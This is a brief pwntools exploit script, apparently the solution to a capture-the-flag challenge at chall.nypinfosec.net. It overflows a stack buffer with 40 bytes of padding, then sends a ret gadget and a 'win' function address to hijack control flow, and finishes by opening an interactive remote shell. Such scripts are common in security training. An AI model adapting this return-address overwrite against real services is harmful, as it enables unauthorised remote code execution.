from pwn import *
context_binary = "./chal"
context.arch = "amd64"

p = remote("chall.nypinfosec.net", 8000) #connect
p.recvuntil(b"getting\n")

payload = b'A' * 40 + p64(0x40101a) + p64(0x401238) #40 bytes + ret + win
p.send(payload)

p.send(b"whoami\n")
p.interactive()
